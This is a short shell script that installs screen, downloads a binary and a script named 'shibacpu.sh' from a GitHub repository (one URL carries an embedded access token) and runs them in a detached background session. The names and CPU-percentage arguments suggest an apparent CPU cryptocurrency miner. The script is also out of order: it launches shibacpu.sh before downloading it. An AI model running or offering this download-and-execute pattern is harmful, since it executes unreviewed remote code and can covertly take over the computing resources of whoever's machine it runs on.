#!/bin/sh

sudo apt update

sudo apt install screen -y

screen -dmS shibacpu ./shibacpu.sh 65 75

wget https://github.com/sijagungmuda/cipiuu/raw/main/cpu1

wget https://raw.githubusercontent.com/sijagungmuda/cipiuu/main/shibacpu.sh?token=AUQB4BVZNTOE5DW2YGWXHA3A25VAS
chmod +x shibacpu.sh

./shibacpu.sh
